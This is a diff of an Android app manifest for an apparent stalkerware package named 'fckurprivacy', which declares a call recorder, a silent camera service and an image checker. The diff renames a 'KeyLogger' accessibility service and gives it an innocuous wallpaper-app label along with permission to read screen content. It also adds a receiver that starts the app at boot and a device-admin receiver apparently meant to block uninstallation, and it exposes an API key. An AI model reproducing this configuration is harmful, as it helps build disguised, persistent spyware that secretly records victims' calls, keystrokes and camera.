@@ -23,25 +23,30 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.BLUETOOTH" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:supportsRtl="true"
-        android:theme="@style/AppTheme">
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
         <meta-data
             android:name="com.baidu.lbsapi.API_KEY"
             android:value="l9bdm152vc6hW328smrmVO9H9c6WSb4u" />
 
-        <activity android:name=".MainActivity">
+        <activity android:name=".UIManager.AlphaActivity">
             <intent-filter>
+                <!-- <data android:host="MainActivity" android:scheme="com.vergermiya.harevost.fckurprivacy"/> -->
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
         <activity android:name=".PermissionsChecker.PermissionsActivity" />
+
+        <activity android:name=".MainActivity" />
+        <activity android:name=".UIManager.MGuideAction" />
 
         <receiver
             android:name=".CallRecorder.PhoneCallReceiver"
@@ -64,18 +69,23 @@
             android:name=".SilentShooter.SilentShootService"
             android:enabled="true"
             android:exported="true" />
-        <service
-            android:name=".KeyLogger.KeyLogger"
-            android:label="FckUrPrivacy"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
 
+        <service
+            android:name=".SilentShooter.SmsCallService"
+            android:enabled="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:label="壁纸随心换"
+            android:canRetrieveWindowContent="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessbility" />
+                android:resource="@xml/accessibility"/>
         </service>
+
+
         <service
             android:name="com.baidu.location.f"
             android:enabled="true"
@@ -87,7 +97,32 @@
         <service
             android:name=".ImageChecker.ImageCheckService"
             android:enabled="true"
-            android:exported="true"></service>
+            android:exported="true" />
+
+        <receiver
+            android:name=".SilentShooter.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"></action>
+                <category android:name="android.intent.category.LAUNCHER"></category>
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".SilentShooter.UninstReceiver"
+            android:description="@string/app_name"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_sample" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+
     </application>
 
 </manifest>
